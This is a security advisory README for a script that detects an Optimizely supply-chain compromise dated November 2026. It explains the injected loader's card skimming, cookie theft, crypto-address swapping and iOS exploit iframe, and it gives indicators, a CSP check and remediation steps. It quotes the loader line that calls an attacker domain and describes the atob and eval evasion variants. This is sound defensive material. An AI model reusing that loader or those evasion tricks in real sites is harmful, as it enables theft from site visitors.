# Optimizely Web Experimentation supply-chain compromise ("OPTIMJACK")

Part of the [PrivacySafe Security Patches](../README.md) collection.

<a name="optimizely-optimjack"></a>

## Optimizely Web Experimentation supply-chain compromise ("OPTIMJACK")

**Script:** [`optimizely/optimizely-optimjack-check.sh`](optimizely-optimjack-check.sh)

On 16 November 2026 an attacker got write access to many unrelated customer projects on Optimizely's Web Experimentation platform and injected a loader into each project's "Project JavaScript" field, the one piece of custom code that runs on every page of every experiment in a project. The file was still served from `cdn.optimizely.com` with Optimizely's own certificate, so nothing about where it came from looked wrong. [Report URI](https://blog.report-uri.com/) found 188 infected snippets across 178 organizations, including Zoom, the BBC, CNN, Salesforce, GitLab, IKEA and HSBC.

| | |
|---|---|
| CVE | None at time of writing (Optimizely describes it as an unauthorized party exploiting a vulnerability in its Experimentation platform; researchers have named it OPTIMJACK) |
| Affected | A project's live Optimizely Web Experimentation snippet, if its Project JavaScript carried the injected loader at any point on 16 November 2026 |
| Not affected | Custom code or variation-level code, which the report does not describe as touched; projects whose snippet Report URI or you confirm was never infected |
| Fixed | Optimizely says it has "fixed the vulnerability and removed the injected code from affected projects." There is nothing for a site operator to patch; what is left is site-side: confirm what happened to your own project, and rotate anything that may have been exposed |
| Attacker infrastructure | The main command-and-control domain, `1688360.cc`, was put on clientHold at 17 Nov 00:37 UTC and no longer resolves; the earlier-wave domain `webshell.lol` likewise from 03:37 UTC. Report URI found every snippet it checked clean by 16 Nov 23:11 UTC |

### What the injected code did

The loader pulled a second file, commonly named `track.js`, from the attacker's domain (or ran an inline copy through `eval()`). That file:

- swapped cryptocurrency addresses for the attacker's own, in page text, the clipboard, and outgoing requests;
- skimmed payment card number, expiry and CVV from a site's own form fields (hosted payment frames such as Stripe or Adyen were out of its reach);
- sent cookies not marked `HttpOnly` and a screenshot of the page to the attacker;
- on iPhones and iPads, loaded the Coruna (iOS 13-17) or DarkSword (iOS 18.x) exploit kit through a hidden iframe.

Three loader variants were seen: a plain `<script src="https://1688360.cc/track.js">`, the same URL hidden in base64 behind `atob()` specifically so a text search for the domain would miss it, and a full inline copy that ran through `eval()` as a fallback when the domain itself was blocked. `check` and `hunt` look for all three, not just the first.

### Quick start

Download the script. The repository is mirrored on GitHub and Codeberg; pick a base URL.

```bash
# BASE from GitHub: https://raw.githubusercontent.com/PrivacySafe/security-patches/refs/heads/main
# BASE from Codeberg: https://codeberg.org/PrivacySafe/security-patches/raw/branch/main
# curl -fLO "$BASE/optimizely/optimizely-optimjack-check.sh"
curl -fLO https://raw.githubusercontent.com/PrivacySafe/security-patches/refs/heads/main/optimizely/optimizely-optimjack-check.sh
```

Read it before running it, then make it executable.

```bash
less optimizely-optimjack-check.sh
chmod +x optimizely-optimjack-check.sh
```

Check your own project's live snippet. No root needed; needs `curl` for `--url`, or scan something you already saved with `--file`.

```bash
./optimizely-optimjack-check.sh check --url https://cdn.optimizely.com/js/YOUR_PROJECT_ID.js
```

Check whether your site's Content-Security-Policy would have blocked this class of attack:

```bash
./optimizely-optimjack-check.sh csp --url https://your-site.example/
```

### Commands

| Command | What it does |
|---|---|
| `check` (default) | Read-only. `--url URL` fetches and scans one snippet; `--file PATH` scans a file you already saved. Exactly one is required. Exit `0` nothing found, `1` a known indicator found, `2` could not be fetched or read |
| `hunt PATH ...` | Read-only. Scans each `PATH` (a file, or a directory searched recursively for `.js`/`.html`/`.htm` files) for the same indicators. Useful for a saved CDN cache, a static export or a backup. Exit `0` nothing found, `1` a lead, `2` nothing readable at any path |
| `csp` | Read-only. `--header VALUE` checks a Content-Security-Policy value you supply (an empty string is a valid answer, meaning no policy); `--url URL` fetches the header from a live response instead. Reports whether it would block, partly block, or let through this payload |
| `rules` | Prints a starting `Content-Security-Policy` line that would have blocked every part of the payload except the in-page address swapping (see below) |
| `version` | Prints the script version |

### What `check` and `hunt` actually look for

- The twelve attacker-controlled domains reported by Report URI and corroborated by other coverage: `1688360.cc` (the main command-and-control server) and eleven `.icu`/other domains used for the iOS exploit chain and an earlier wave by the same actor.
- Every `atob('...')` or `atob("...")` argument in the file, base64-decoded and checked against those same domains. This is the specific evasion Report URI described: a plain text search for the domain misses it, because the domain only appears after decoding.
- Four markers the payload set on an infected page: the globals `window._k7` and `window.__k7b`, the iOS loader's `data-channel-code="02111110"` attribute, and the Coruna telemetry channel code `BIGNIAO`.
- The eight cryptocurrency addresses Report URI published as the attacker's own (BTC, ETH/EVM, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin). A clipper has to carry the address it swaps *to* somewhere in its own code, so these are worth checking even where the domain itself has been hidden beyond the `atob()` case above.
- The exact SHA-256 of the two published builds of the payload file itself. The attacker rebuilt it 26 times during the day; these two are the only builds with a published hash, so a match is conclusive but a non-match proves nothing about the other 24.

None of this proves a project was *never* affected. Report URI's own sweep found every snippet clean by 16 Nov 23:11 UTC, so a check run after that time will not see injected code that was removed earlier the same day. A clean result from this script is not a substitute for checking your Optimizely project's own change history (Settings > History) for 16 November.

### If you find something

Treat it the same way whichever command finds it:

1. Open your Optimizely project's change history (Settings > History) and look at every change to Project JavaScript on 16 November, and who or what made it (the history also shows whether a change came through the REST API or the web UI).
2. Review and rotate every user, API token and integration with write access to the project.
3. Treat any card number typed into your own form fields on 16 November, and any secret held in a cookie not marked `HttpOnly`, as exposed.
4. If you visited an affected site yourself on 16 November on an iPhone or iPad, update to iOS 18.7.3 or later, or iOS 26.3 or later, and check recent cryptocurrency transfers and card statements.

### Why this script has no `mitigate`

There is nothing local to fix: the compromise was on Optimizely's own platform, and Optimizely has already removed the injected code and says it has secured the affected accounts. `rules` prints a Content-Security-Policy that would have blocked the loader, the `eval()` fallback, the data exfiltration and the iOS exploit iframe, but it cannot be applied automatically, because every site's existing script, connect and frame sources are different and a wrong CSP breaks the site rather than the attack. It also cannot stop the clipboard and page-text address swapping: that runs inside the already-trusted Optimizely script's own execution, which a CSP has no way to tell apart from anything else that script does. Start any new CSP in `Content-Security-Policy-Report-Only` to see what it would have broken before enforcing it.

---

## ⚠️ Important notice

These scripts are used on our production systems and undergo testing, but they may require adaptation for other environments. Review the source code before running any script, test changes in a non-production environment where possible, and maintain current backups. This software is provided without warranty.

## 🏛️ Support PrivacySafe Foundation

[PrivacySafe Foundation](https://privacysafe.foundation) is a 501(c)(3) nonprofit public charity supporting Free/Libre and Open Source Software (FLOSS), cybersecurity education, decentralized technology, documentation, standards work, and public-interest privacy and security research.

Security work doesn't stop when a disclosure drops at midnight. If this repository helped you protect your users, please help us keep doing it:

* **[Donate directly to the Foundation](https://privacysafe.foundation)**
* [Open Collective](https://opencollective.com/privacysafe)
* [Ko-fi](https://ko-fi.com/R6R1194HN7)
* [Liberapay](https://liberapay.com/PrivacySafe/donate)

The Foundation website provides options for card donations, PayPal/Venmo, cryptocurrency, checks, and other forms of support. Donations are often tax-deductible in the USA. Federal EIN: 41-5237617.

## 🤝 Contributing

Found a bug in a script, or have a mitigation that belongs here? Please fork and submit a focused pull request.

⚠️ **Do not report unpatched vulnerabilities in a public issue.** Follow our [security policy](../SECURITY.md) instead. Never send sensitive information through ordinary direct messages or unencrypted email.

- **Contribution terms:** [`CONTRIBUTING.md`](../CONTRIBUTING.md)
- **Code of Conduct:** [`CODE_OF_CONDUCT.md`](../CODE_OF_CONDUCT.md)
- **AI Contribution Policy:** [`AI_POLICY.md`](../AI_POLICY.md)
- **Security and vulnerability reporting:** [`SECURITY.md`](../SECURITY.md)

## 🔐 More from PrivacySafe

* **[PrivacySafe](https://privacysafe.app):** Privacy-by-design software for home, teams, and organizations. Sign up free, no phone number required.
* **[Bits On Tape](https://bitsontape.com):** Our newsletter covering cybersecurity, privacy, FLOSS, AI, and digital culture.
* **[Ivy Cyber](https://ivycyber.com):** Hosting, enterprise deployment, training, and technical support, including help hardening your own infrastructure.

## ⚖️ License

<a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow"><img src="https://licensebuttons.net/p/zero/1.0/88x31.png" alt="CC0" /></a>

Security patches belong to everyone. To the extent possible under law, <a href="https://ivycyber.com" rel="nofollow">Ivy Cyber LLC</a> has waived all copyright and related or neighboring rights to this repository, including its scripts and documentation, under the <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow">Creative Commons CC0 1.0 Universal Public Domain Dedication</a> (`CC0-1.0`). Feel free to copy, remix, and share. If you'd like to give back, please [donate to PrivacySafe Foundation](https://privacysafe.foundation) 501c3 nonprofit.

See [`NOTICE`](../NOTICE) and [`LICENSE`](../LICENSE). Third-party components retain their original copyrights and licenses.

CC0 does not waive trademark or patent rights. PrivacySafe® and 3NWeb® are registered trademarks. PrivacySafe Foundation™ and Ivy Cyber™ are pending trademarks. This dedication does not grant permission to use these marks in a manner that suggests sponsorship, endorsement, affiliation, or origin.
